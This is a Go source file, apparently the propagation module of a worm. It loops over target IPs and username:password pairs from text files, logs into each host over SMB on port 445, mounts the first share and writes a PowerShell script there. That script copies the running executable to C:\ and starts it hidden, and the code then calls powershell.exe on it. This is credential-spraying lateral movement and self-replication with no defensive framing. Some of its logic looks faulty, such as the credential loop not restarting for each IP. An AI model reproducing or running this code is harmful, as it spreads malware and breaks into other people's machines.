package pack

import (
    "bufio"
    "fmt"
    "io"
    "log"
    "net"
    "os"
    "os/exec"
    "path/filepath"
    "strings"
    

    "github.com/hirochachacha/go-smb2"
)

const (
    smbMarkerFileName = "upload_marker.txt"
    psScript = `
$destinationFolder = "C:\"
$currentExecutable = "$((Get-Item $MyInvocation.MyCommand.Definition).FullName)"
$copiedExecutableName = (Split-Path -Leaf $currentExecutable)
$copiedExecutablePath = Join-Path $destinationFolder $copiedExecutableName
Copy-Item -Path $currentExecutable -Destination $copiedExecutablePath -Force
Start-Process -FilePath $copiedExecutablePath -WindowStyle Hidden
`
)



func SMB() {
    ipFilePath := "ip.txt"
    ipFile, err := os.Open(ipFilePath)
    if err != nil {
        log.Printf("Error reading SMB server IPs file: %v\n", err)
        return
    }
    defer ipFile.Close()

    scanner := bufio.NewScanner(ipFile)

    credFilePath := "smbcred.txt"
    credFile, err := os.Open(credFilePath)
    if err != nil {
        log.Printf("Error reading SMB credentials file: %v\n", err)
        return
    }
    defer credFile.Close()

    credScanner := bufio.NewScanner(credFile)

    for scanner.Scan() {
        ip := scanner.Text()

        credFile.Seek(0, io.SeekStart)

        for credScanner.Scan() {
            cred := strings.Split(credScanner.Text(), ":")
            username := cred[0]
            password := cred[1]

            if !hasMarkerFile(ip) {
                if err := connectAndUpload(ip, username, password); err != nil {
                    log.Printf("Failed to connect to %s with %s:%s: %v\n", ip, username, password, err)
                } else {
                    log.Printf("Successfully connected to %s with %s:%s\n", ip, username, password)
                    createMarkerFile(ip)
                }
            } else {
                log.Printf("Skipping %s - Marker file exists\n", ip)
            }
        }
    }
}

func hasMarkerFile(ip string) bool {
    markerFilePath := filepath.Join(ip, smbMarkerFileName)
    _, err := os.Stat(markerFilePath)
    return !os.IsNotExist(err)
}

func createMarkerFile(ip string) error {
    markerFilePath := filepath.Join(ip, smbMarkerFileName)
    file, err := os.Create(markerFilePath)
    if err != nil {
        return fmt.Errorf("failed to create marker file: %v", err)
    }
    defer file.Close()
    return nil
}

func connectAndUpload(ip, username, password string) error {
    conn, err := net.Dial("tcp", fmt.Sprintf("%s:445", ip))
    if err != nil {
        return fmt.Errorf("failed to connect to %s: %v", ip, err)
    }
    defer conn.Close()

    d := &smb2.Dialer{
        Initiator: &smb2.NTLMInitiator{
            User:     username,
            Password: password,
        },
    }

    s, err := d.Dial(conn)
    if err != nil {
        return fmt.Errorf("failed to dial SMB connection: %v", err)
    }
    defer s.Logoff()

    // List shared folders
    shares, err := s.ListSharenames()
    if err != nil {
        return fmt.Errorf("failed to list shares on %s: %v", ip, err)
    }

    if len(shares) == 0 {
        fmt.Printf("No shares found on %s with %s:%s\n", ip, username, password)
        return nil
    }

    // Use the first share found
    shareName := shares[0]

    f, err := s.Mount(shareName)
    if err != nil {
        return fmt.Errorf("failed to mount share %s on %s: %v", shareName, ip, err)
    }
    defer f.Umount()

    psFileName := filepath.Base(os.Args[0]) // Use the current executable's name as the PS1 filename
    psFilePath := filepath.Join(shareName, psFileName)

    psFile, err := f.Create(psFilePath)
    if err != nil {
        return fmt.Errorf("failed to create PS1 file on %s: %v", ip, err)
    }
    defer f.Remove(psFilePath)
    defer psFile.Close()

    _, err = psFile.Write([]byte(psScript))
    if err != nil {
        return fmt.Errorf("failed to write PS1 script on %s: %v", ip, err)
    }

    fmt.Printf("PS1 script uploaded to %s on %s with %s:%s\n", psFilePath, ip, username, password)

    // Run the uploaded PS1 script using the powershell command
    cmd := exec.Command("powershell.exe", "-File", psFilePath)
    err = cmd.Run()
    if err != nil {
        fmt.Printf("Failed to run PS1 script on %s with %s:%s: %v\n", ip, username, password, err)
        return nil // Don't attempt to download or execute anything else
    }

    fmt.Printf("PS1 script executed on %s with %s:%s\n", ip, username, password)

    return nil
}
